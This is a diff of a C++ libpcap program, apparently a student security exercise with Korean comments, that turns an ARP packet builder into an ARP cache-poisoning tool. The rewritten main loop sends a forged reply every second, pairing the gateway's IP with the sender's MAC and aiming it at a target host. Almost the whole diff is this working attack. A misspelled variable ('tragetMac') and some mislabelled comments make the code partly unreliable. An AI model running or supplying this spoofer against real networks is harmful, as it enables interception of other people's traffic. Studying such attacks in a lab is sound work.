@@ -65,7 +65,7 @@ int get_mac_address(const std::string& device, Mac& mac_out) {
     return 0;
 }
 
-EthArpPacket makeArpReq(Ip srcIp, Mac srcMac, Ip destIp) {
+EthArpPacket makeArpReq(Ip srcIp, Mac srcMac, Ip targetIp) {
     
     EthArpPacket arpReqPacket;
     arpReqPacket.eth_.smac_ = srcMac;
@@ -80,16 +80,16 @@ EthArpPacket makeArpReq(Ip srcIp, Mac srcMac, Ip destIp) {
     arpReqPacket.arp_.smac_ = srcMac;
     arpReqPacket.arp_.sip_= htonl(uint32_t(srcIp));
     arpReqPacket.arp_.tmac_ = Mac::nullMac();
-    arpReqPacket.arp_.tip_ = htonl(uint32_t(destIp));
+    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));
 
     return arpReqPacket;
 }
 
-EthArpPacket makeArpRes(Ip srcIp, Mac srcMac, Ip destIp, Mac destMac) {
+EthArpPacket makeArpRes(Ip gatewayIp, Mac myMac, Ip targetIp, Mac targetMac) {
 
     EthArpPacket arpReqPacket;
-    arpReqPacket.eth_.smac_ = srcMac;
-	arpReqPacket.eth_.dmac_ = Mac::broadcastMac();
+    arpReqPacket.eth_.smac_ = myMac;
+	arpReqPacket.eth_.dmac_ = targetMac;
     arpReqPacket.eth_.type_ = htons(EthHdr::Arp);
 
     arpReqPacket.arp_.hln_ = Mac::Size;
@@ -97,10 +97,10 @@ EthArpPacket makeArpRes(Ip srcIp, Mac srcMac, Ip destIp, Mac destMac) {
 	arpReqPacket.arp_.op_ = htons(ArpHdr::Reply);
     arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
 	arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
-    arpReqPacket.arp_.smac_ = srcMac;
-    arpReqPacket.arp_.sip_= htonl(uint32_t(srcIp));
-    arpReqPacket.arp_.tmac_ = Mac::nullMac();
-    arpReqPacket.arp_.tip_ = htonl(uint32_t(destIp));
+    arpReqPacket.arp_.smac_ = myMac;
+    arpReqPacket.arp_.sip_= htonl(uint32_t(gatewayIp));
+    arpReqPacket.arp_.tmac_ = targetMac;
+    arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));
 
     return arpReqPacket;
 }
@@ -108,11 +108,12 @@ EthArpPacket makeArpRes(Ip srcIp, Mac srcMac, Ip destIp, Mac destMac) {
 // 이건 내가 작성
 Mac get_target_mac(pcap_t* pcap, Ip myIp, Mac myMac, Ip targetIp) {
 
+    // 패킷 만들기
     EthArpPacket packet = makeArpReq(myIp, myMac, targetIp);    
     
-    //결과를 결과패킷 받고, 파싱
+    //결과를 결과패킷 수신, 파싱
     while (true) {
-        // 패킷 보내고
+        // 패킷 수신
         int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (sendRes != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
@@ -182,31 +183,16 @@ int main(int argc, char* argv[]) {
 
     // 패킷 수신
     while (true) {
-
-        // 멘토님 코드
-		struct pcap_pkthdr* header;
-		const u_char* packet;
-		int res = pcap_next_ex(pcap, &header, &packet);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-			break;
+        
+        // 패킷 만들기
+        EthArpPacket arpRes = makeArpRes(gatewayIp, myMac, targetIp, tragetMac);
+        // 패킷 보내기 반복~~
+        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arpRes), sizeof(EthArpPacket));
+        if (sendRes != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
         }
 
-        
-
-        
-
+        sleep(1);
     }
-
-    
-
-
-
-    // 패킷 전송!
-    EthArpPacket packet;
-
-    
-
     return 0;
 }
